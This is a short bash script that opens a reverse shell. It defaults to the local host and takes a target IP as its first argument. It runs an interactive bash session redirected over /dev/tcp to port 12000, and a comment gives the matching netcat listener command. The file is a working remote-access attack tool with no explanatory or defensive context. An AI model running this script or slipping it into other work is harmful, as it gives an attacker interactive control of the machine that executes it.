#!/bin/bash

# Serve a reverse shell to the chosen IP.
# Server should already be listening with:
# nc -lvnp 12000 -s ${ip}

ip="127.0.0.1"
if [[ $1 != "" ]]; then
    ip=$1
fi

/bin/bash -c "bash -i >&/dev/tcp/${ip}/12000 0>&1"
